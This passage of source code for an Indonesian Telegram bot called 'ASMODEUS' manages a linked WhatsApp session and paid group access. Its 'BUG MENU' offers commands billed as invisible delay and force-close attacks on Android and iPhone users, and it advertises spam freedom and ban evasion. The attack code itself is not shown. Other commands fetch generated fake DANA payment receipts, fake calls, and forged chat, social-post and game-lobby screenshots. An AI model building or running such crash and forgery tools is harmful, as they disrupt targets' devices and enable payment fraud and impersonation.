        ['/cekprem', '/cekprem', 'Cek status premium'],
        ['/connect', '/connect 628xxx', 'Connect WA'],
        ['/resetsession', '/resetsession', 'Reset session'],
        ['/status', '/status', 'Cek status bot'],
        ['/addgrouppremium', '/addgrouppremium 30', 'Tambah premium group'],
        ['/delgrouppremium', '/delgrouppremium', 'Hapus premium group'],
        ['/listgrouppremium', '/listgrouppremium', 'List semua premium group'],
        ['/cekpremiumgroup', '/cekpremiumgroup', 'Cek status premium group']
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{
        text: "Back",
        callback_data: "back_to_start",
        style: "danger",
        icon_custom_emoji_id: "6100553439656284469"
      }]
    ]).reply_markup
  });
});

bot.action("holee", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const msg = new HTML()
    .photo(PHOTOS[0], "Bug Menu")
    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " BUG MENU")
    .divider()
    .heading(2, HTML.customEmoji("4956499161319998529", "📱") + " ANDROID BUGS")
    .table(
      [
        ["Commands", "Effect"],
        ["/xbugs", "INVISIBLE DELAY ANDRO"],
        ["/xkill", "INVISIBLE DELAY ANDRO"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, HTML.customEmoji("6298678524379137990", "📱") + " IPHONE BUGS")
    .table(
      [
        ["Commands", "Effect"],
        ["/noctex", "Force Close Invisibles"],
        ["/zexon", "FORCE X CLOSE"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, HTML.customEmoji("4956233646441760046", "✅") + " Information Bugs")
    .taskList(
      { text: "Target Auto C1", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
    )
    .divider()
    .paragraph(
      HTML.customEmoji("6093386410549581063", "🕷") +
      " " + HTML.italic(HTML.bold("Asmodeus"))
    )
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{
        text: "Back",
        callback_data: "back_to_start",
        style: "danger",
        icon_custom_emoji_id: "6100553439656284469"
      }]
    ]).reply_markup
  });
});

bot.action("back_to_start", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";

  const msg = buildMainMenu(userId, Name, waktuRunPanel, waStatus);

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: buildMainKeyboard()
  });
});

const premiumGroupsFile = "./Database/premiumGroups.json";

if (!fs.existsSync("./Database")) {
  fs.mkdirSync("./Database", { recursive: true });
}

function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}

function isGroupPremium(groupId) {
  const groups = loadPremiumGroups();
  return groups.some(item => item.startsWith(groupId.toString() + "|"));
}

function checkAndCleanExpiredGroups() {
  const groups = loadPremiumGroups();
  let changed = false;

  for (const item of groups) {
    const [groupId, expiredTimestamp] = item.split("|");
    if (Date.now() > parseInt(expiredTimestamp)) {
      removeGroupPremium(groupId);
      changed = true;
    }
  }

  if (changed) {
    console.log("✅ Expired premium groups cleaned");
  }
}

function addGroupPremium(groupId, days) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();

  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (exists) {
    return { success: false, message: "Group sudah premium" };
  }

  const expiredDate = new Date();
  expiredDate.setDate(expiredDate.getDate() + days);
  const expiredTimestamp = expiredDate.getTime();
  const formattedExpired = expiredDate.toLocaleDateString('id-ID', {
    day: 'numeric',
    month: 'long',
    year: 'numeric'
  });

  premiumGroups.push(`${groupId}|${expiredTimestamp}`);
  savePremiumGroups(premiumGroups);

  return {
    success: true,
    message: `Group premium aktif selama ${days} hari`,
    expired: formattedExpired
  };
}

function removeGroupPremium(groupId) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();

  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (!exists) return false;

  premiumGroups = premiumGroups.filter(item => !item.startsWith(`${groupId}|`));
  savePremiumGroups(premiumGroups);
  return true;
}

function isAdminUser(userId) {
  return adminUsers.includes(userId.toString());
}

bot.command('addgrouppremium', async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
    return ctx.reply("⚠️ Akses hanya untuk owner / admin");
  }

  if (ctx.chat.type === "private") {
    return ctx.reply("⚠️ Command ini hanya bisa digunakan di dalam group");
  }

  const args = ctx.message.text.split(" ");
  let days = 30;

  if (args.length >= 2) {
    days = parseInt(args[1]);
    if (isNaN(days) || days <= 0) {
      return ctx.reply("⚠️ Durasi harus angka positif!\nContoh: /addgrouppremium 30");
    }
  }

  const groupId = ctx.chat.id.toString();
  const groupName = ctx.chat.title || "Tidak ada nama";
  const adminName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;

  if (isGroupPremium(groupId)) {
    const msg = new HTML()
      .heading(2, "⚠️ GROUP SUDAH PREMIUM")
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n\n` +
        "Group ini sudah terdaftar sebagai premium!"
      )
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const result = addGroupPremium(groupId, days);

  if (result.success) {
    const msg = new HTML()
      .heading(2, "✅ GROUP PREMIUM BERHASIL DITAMBAHKAN!")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama Group:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID Group:") + ` <code>${groupId}</code>\n` +
        HTML.bold("👤 Ditambahkan oleh:") + ` ${adminName}\n` +
        HTML.bold("📅 Durasi:") + ` ${days} hari\n` +
        HTML.bold("⏰ Expired:") + ` ${result.expired}`
      )
      .divider()
      .paragraph("✨ Group sekarang memiliki akses premium! ✨")
      .build();
    await ctx.sendRichMessage(msg);
  } else {
    const msg = new HTML()
      .heading(2, "⚠️ GAGAL TAMBAH PREMIUM")
      .paragraph(HTML.bold("📌 Error:") + ` ${result.message}`)
      .build();
    await ctx.sendRichMessage(msg);
  }
});

bot.command('delgrouppremium', async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
    return ctx.reply("⚠️ Akses hanya untuk owner / admin");
  }

  if (ctx.chat.type === "private") {
    return ctx.reply("⚠️ Command ini hanya bisa digunakan di dalam group");
  }

  const groupId = ctx.chat.id.toString();
  const groupName = ctx.chat.title || "Tidak ada nama";

  if (!isGroupPremium(groupId)) {
    const msg = new HTML()
      .heading(2, "⚠️ GROUP TIDAK PREMIUM")
      .paragraph(`Group *${groupName}* tidak terdaftar sebagai premium!`)
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const success = removeGroupPremium(groupId);

  if (success) {
    const msg = new HTML()
      .heading(2, "✅ GROUP PREMIUM BERHASIL DIHAPUS!")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>`
      )
      .divider()
      .paragraph("Group tidak lagi memiliki akses premium.")
      .build();
    await ctx.sendRichMessage(msg);
  } else {
    ctx.reply("⚠️ Gagal menghapus premium!");
  }
});

bot.command('listgrouppremium', async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString()) && !isAdminUser(ctx.from.id)) {
    return ctx.reply("⚠️ Akses hanya untuk owner / admin");
  }

  checkAndCleanExpiredGroups();
  const premiumGroups = loadPremiumGroups();

  if (premiumGroups.length === 0) {
    const msg = new HTML()
      .heading(2, "📋 DAFTAR GROUP PREMIUM")
      .paragraph("Belum ada group yang terdaftar sebagai premium.")
      .build();
    return await ctx.sendRichMessage(msg);
  }

  let listText = "📋 *DAFTAR GROUP PREMIUM*\n\n";
  for (let i = 0; i < premiumGroups.length; i++) {
    const [groupId, expiredTimestamp] = premiumGroups[i].split("|");
    const expiredDate = new Date(parseInt(expiredTimestamp));
    const formattedDate = expiredDate.toLocaleDateString("id-ID", {
      day: "numeric",
      month: "long",
      year: "numeric"
    });
    listText += `${i + 1}. ID: \`${groupId}\`\n`;
    listText += `   Expired: ${formattedDate}\n\n`;
  }

  const msg = new HTML()
    .heading(2, "📋 DAFTAR GROUP PREMIUM")
    .pre(listText, 'text')
    .build();
  await ctx.sendRichMessage(msg);
});

bot.command('cekpremiumgroup', async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("⚠️ Command ini hanya bisa digunakan di dalam group");
  }

  const groupId = ctx.chat.id.toString();
  const groupName = ctx.chat.title || "Tidak ada nama";

  checkAndCleanExpiredGroups();
  const premiumGroups = loadPremiumGroups();
  const entry = premiumGroups.find(item => item.startsWith(`${groupId}|`));

  if (!entry) {
    const msg = new HTML()
      .heading(2, "⚠️ GROUP PREMIUM TIDAK AKTIF")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
        HTML.bold("📌 Status:") + " Tidak premium"
      )
      .divider()
      .paragraph("Hubungi owner untuk upgrade premium!")
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const expiredTimestamp = parseInt(entry.split("|")[1]);
  const remaining = expiredTimestamp - Date.now();

  if (remaining <= 0) {
    removeGroupPremium(groupId);
    const msg = new HTML()
      .heading(2, "⚠️ GROUP PREMIUM EXPIRED")
      .divider()
      .paragraph(
        HTML.bold("📛 Nama:") + ` ${groupName}\n` +
        HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
        HTML.bold("📌 Status:") + " Premium telah habis"
      )
      .divider()
      .paragraph("Hubungi owner untuk perpanjang!")
      .build();
    return await ctx.sendRichMessage(msg);
  }

  const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
  const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));

  const msg = new HTML()
    .heading(2, "✅ GROUP PREMIUM AKTIF")
    .divider()
    .paragraph(
      HTML.bold("📛 Nama:") + ` ${groupName}\n` +
      HTML.bold("🆔 ID:") + ` <code>${groupId}</code>\n` +
      HTML.bold("⏰ Sisa waktu:") + ` ${days} hari ${hours} jam\n` +
      HTML.bold("📌 Status:") + " Aktif"
    )
    .build();
  await ctx.sendRichMessage(msg);
});

bot.command('sketch', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const imageUrl = textInput.trim();

  if (!imageUrl) {
    return ctx.reply('Format salah!\nGunakan: /sketch [link_gambar]\nContoh:\n/sketch https://example.com/foto.jpg');
  }

  if (!imageUrl.startsWith('http://') && !imageUrl.startsWith('https://')) {
    return ctx.reply('Input harus berupa link URL gambar yang valid! (Harus diawali http:// atau https://)');
  }

  await ctx.reply('Sedang memproses gambar dari link menjadi sketsa, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/image2sketch?url=${encodeURIComponent(imageUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: 'Sukses Mengubah Menjadi Sketsa dari Link!*',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan atau server API sedang down.');
  }
});

bot.command('fakedana', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const amount = textInput.trim();

  if (!amount) {
    return ctx.reply('Format salah!\nGunakan: /fakedana [nominal]\n\nContoh:\n/fakedana 50000');
  }

  if (isNaN(amount)) {
    return ctx.reply('Nominal harus berupa angka saja tanpa titik/koma! (Contoh: 100000)');
  }

  await ctx.reply('Sedang memproses gambar prank, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/fakedana?amount=${encodeURIComponent(amount)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate Fake DANA\nNominal: Rp ${parseInt(amount).toLocaleString('id-ID')}\nGunakan dengan bijak untuk prank teman!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data dari API.');
  }
});

bot.command('iqcsticker', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /iqcsticker link_pp | isi teks chat\n\nContoh:\n/iqc_sticker https://example.com/pp.jpg | Info crash wa hari ini');
  }

  const [urlProfil, textChat] = textInput.split('|');

  if (!urlProfil || !textChat) {
    return ctx.reply('Semua kolom harus diisi! Pastikan gunakan pembatas | dengan benar.');
  }

  const linkProfil = urlProfil.trim();

  if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
    return ctx.reply('Parameter pertama harus berupa link URL foto profil yang valid!');
  }

  await ctx.reply('Sedang Proses, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/iqc-sticker?text=${encodeURIComponent(textChat.trim())}&img=${encodeURIComponent(linkProfil)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate iPhone Quote Sticker!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('iqc', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const quoteText = textInput.trim();

  if (!quoteText) {
    return ctx.reply('Format salah!\nGunakan: /iqc [teks]\n\nContoh:\n/iqc Jangan lupa upgrade ke VIP Empire!');
  }

  await ctx.reply('Sedang membuat iPhone Quote Chat, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/iqc?text=${encodeURIComponent(quoteText)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: 'Sukses Generate iPhone Quote Chat!',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('igc', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /igc link_foto | nama grup | jumlah peserta\n\nContoh:\n/igc https://example.com/pp.jpg | Xylent Empire | 2,500 Peserta');
  }

  const [urlProfil, namaGroup, jumlahPeserta] = textInput.split('|');

  if (!urlProfil || !namaGroup || !jumlahPeserta) {
    return ctx.reply('Semua kolom harus diisi! Pastikan gunakan tanda pembatas | dengan benar.');
  }

  const linkProfil = urlProfil.trim();
  if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
    return ctx.reply('Parameter pertama harus berupa link URL foto profil yang valid (diawali http/https)!');
  }

  await ctx.reply('Sedang Proses tampilan iPhone Group Chat, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/igc?url=${encodeURIComponent(linkProfil)}&name=${encodeURIComponent(namaGroup.trim())}&member=${encodeURIComponent(jumlahPeserta.trim())}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate iPhone Group Chat\nGroup: ${namaGroup.trim()}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses data ke API.');
  }
});

bot.command('music', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /music link_thumbnail | judul lagu\n\nContoh:\n/music https://example.com/cover.jpg | Cyberpunk 2026 Soundtrack');
  }

  const [imgUrl, musicName] = textInput.split('|');

  if (!imgUrl || !musicName) {
    return ctx.reply('Kedua kolom harus diisi! Pastikan gunakan pembatas | dengan benar.');
  }

  const cleanImgUrl = imgUrl.trim();

  if (!cleanImgUrl.startsWith('http://') && !cleanImgUrl.startsWith('https://')) {
    return ctx.reply('Parameter pertama harus berupa link URL thumbnail gambar yang valid (diawali http/https)!');
  }

  await ctx.reply('Sedang Proses tampilan Music Player, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/music?img=${encodeURIComponent(cleanImgUrl)}&name=${encodeURIComponent(musicName.trim())}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate Music Player!\n🎵 Lagu: ${musicName.trim()}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('tanyaustadz', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const ustadzQuery = textInput.trim();

  if (!ustadzQuery) {
    return ctx.reply('Format salah!\nGunakan: /tanyaustadz [pertanyaan]\n\nContoh:\n/tanyaustadz Ustadz, bagaimana hukumnya memakai script orang lain?');
  }

  await ctx.reply('Sedang Proses Tanya Ustadz, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(ustadzQuery)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: 'Sukses Generate Mockup Tanya Ustadz',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('threads', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan urutan sesuai dokumentasi API:\n/threads nama | username | link_prof | isi_post | waktu\n\nContoh lengkap:\n/threads xyzen | xyzenofficial | https://link.com/pic.jpg | Halo Dunia | 5m');
  }

  const parts = textInput.split('|').map(p => p.trim());

  const name = parts[0];
  const username = parts[1];
  const pfp = parts[2];
  const textChat = parts[3];
  const waktu = parts[4];

  if (!name || !textChat) {
    return ctx.reply('Gagal! Parameter Nama (ke-1) dan Isi Post (ke-4) wajib diisi.\n\nFormat: nama | username | link_pfp | isi_post | waktu');
  }

  await ctx.reply('Sedang Proses render tampilan Threads Post, mohon tunggu...');

  try {
    let apiUrl = `https://api.azbry.com/api/maker/threadspost?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textChat)}`;

    if (username) apiUrl += `&username=${encodeURIComponent(username)}`;
    if (pfp) apiUrl += `&pfp=${encodeURIComponent(pfp)}`;
    if (waktu) apiUrl += `&waktu=${encodeURIComponent(waktu)}`;

    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Create Threads Post!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses data ke API.');
  }
});

bot.command('fakecall', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/fakecall nama_penelepon | durasi_waktu | link_foto_profil\n\nContoh:\n/fakecall Ayank | 00:00 | https://c.top4top.io/p_3815w0ycy1.jpg');
  }

  const [name, time, ppUrl] = textInput.split('|').map(p => p.trim());

  if (!name || !time || !ppUrl) {
    return ctx.reply('Semua kolom (Nama, Waktu, dan Link PP) wajib diisi!');
  }

  if (!ppUrl.startsWith('http://') && !ppUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL foto profil yang valid!');
  }

  await ctx.reply('Sedang Proses Generate tampilan panggilan palsu, mohon tunggu...');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/fakecall?name=${encodeURIComponent(name)}&time=${encodeURIComponent(time)}&pp=${encodeURIComponent(ppUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `*Sukses Generate Fakecall!*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar fakecall ke API.');
  }
});

bot.command('idcard', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/idcard nama | jabatan/title | nama_script | link_kontak\n\nContoh:\n/idcard Saurus | Creator | Api synox | https://t.me/lordsaurus');
  }

  const [name, title, script, contact] = textInput.split('|').map(p => p.trim());

  if (!name || !title || !script || !contact) {
    return ctx.reply('Semua kolom (Nama, Title, Script, dan Kontak) harus diisi lengkap!');
  }

  await ctx.reply('Sedang Proses Genarate  Developer ID Card Mohon Tunggu.');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/idcard?name=${encodeURIComponent(name)}&title=${encodeURIComponent(title)}&script=${encodeURIComponent(script)}&contact=${encodeURIComponent(contact)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: ` *Sukses Generate Developer ID Card!*\n👤 Owner: *${name}*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses Developer ID Card.');
  }
});

bot.command('spotifycard', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/spotifycard judul_lagu | nama_artis | link_cover_album\n\nContoh:\n/spotifycard Bergema sampai selamanya | Nadhif Basalamah | https://c.top4top.io/p_3815mp2s21.jpg');
  }

  const [title, artist, coverUrl] = textInput.split('|').map(p => p.trim());

  if (!title || !artist || !coverUrl) {
    return ctx.reply('Semua kolom (Judul, Artis, dan Link Cover) wajib diisi!');
  }

  if (!coverUrl.startsWith('http://') && !coverUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL cover album yang valid!');
  }

  await ctx.reply('Sedang membuat Spotify Now Playing card mohon tunggu...');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/spotifycard?title=${encodeURIComponent(title)}&artist=${encodeURIComponent(artist)}&cover=${encodeURIComponent(coverUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `*Sukses Generate Spotify Card!*\n🎵 *${title}* — ${artist}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data gambar Spotify dari API.');
  }
});

bot.command('ttqc', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/ttqc username | teks_chat | link_avatar\n\nContoh:\n/ttqc Saurus | Just friend kok cemburu😌 | https://c.top4top.io/p_3827ycihz1.jpg');
  }

  const [username, textChat, avatarUrl] = textInput.split('|').map(p => p.trim());

  if (!username || !textChat || !avatarUrl) {
    return ctx.reply('Semua kolom (Username, Teks Chat, dan Link Avatar) wajib diisi!');
  }

  if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL avatar yang valid!');
  }

  await ctx.reply('Sedang Proses Generate TikTok Quote Chat Mohon Tunggu');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/ttqc?username=${encodeURIComponent(username)}&text=${encodeURIComponent(textChat)}&avatar=${encodeURIComponent(avatarUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `*Sukses Generate TikTok Quote Chat!*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses data ke API Canvas TikTok.');
  }
});

bot.command('winquote', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const quote = textInput.trim();

  if (!quote) {
    return ctx.reply('Format salah!\nGunakan: /winquote [teks]\n\nContoh:\n/winquote kenapa nyahh aku salah mulu');
  }

  await ctx.reply('Sedang Proses Generate Windows Media Player Quotes, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/windows-quotes.php?text=${encodeURIComponent(quote)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: 'Sukses Generate Windows Quotes!',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data dari API.');
  }
});

bot.command('lobbyff', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /lobbyff nickname | versi_background\n\nContoh:\n/lobbyff Nanas | 9');
  }

  const [nickname, versi] = textInput.split('|').map(p => p.trim());

  if (!nickname || !versi || isNaN(versi)) {
    return ctx.reply('Gagal! Nickname dan versi (harus angka) wajib diisi.\n\nFormat: /lobbyff nama | versi');
  }

  await ctx.reply('Sedang menyiapkan lobby Free Fire kamu, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ff.php?nickname=${encodeURIComponent(nickname)}&versi=${encodeURIComponent(versi)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate Fake Lobby FF\n👤 Nickname: *${nickname}*\n🖼️ Versi Background: *${versi}*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan. Pastikan pilihan versi latar belakang tersedia.');
  }
});

bot.command('lobbyml', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/lobbyml username | link_avatar | rank | indeks_border\n\nContoh:\n/lobbyml Owiee | https://example.com/avatar.jpg | imo | 0\n\nPilihan Rank: epic, glory, gm, honor, imo, mawi, legend');
  }

  const [username, avatarUrl, rank, border] = textInput.split('|').map(p => p.trim());

  if (!username || !avatarUrl || !rank || border === undefined || border === '') {
    return ctx.reply('Semua kolom (Username, Link Avatar, Rank, dan Border) wajib diisi!\nFormat: /lobbyml nama | link | rank | border');
  }

  if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
    return ctx.reply('Parameter kedua harus berupa link URL avatar gambar yang valid (diawali http/https)!');
  }

  const validRanks = ['epic', 'glory', 'gm', 'honor', 'imo', 'mawi', 'legend'];
  if (!validRanks.includes(rank.toLowerCase())) {
    return ctx.reply(`Rank tidak valid! Pilih salah satu dari: ${validRanks.join(', ')}`);
  }

  await ctx.reply('Sedang Proses Generate Fake Lobby MLBB, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ml.php?username=${encodeURIComponent(username)}&avatar=${encodeURIComponent(avatarUrl)}&rank=${encodeURIComponent(rank.toLowerCase())}&border=${encodeURIComponent(border)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    const buf = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buf }, {
      caption: `Sukses Generate Fake Lobby MLBB\n👤 Nickname: ${username}\n🏅 Rank: ${rank.toUpperCase()}\n🖼️ Border ID: *${border}*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
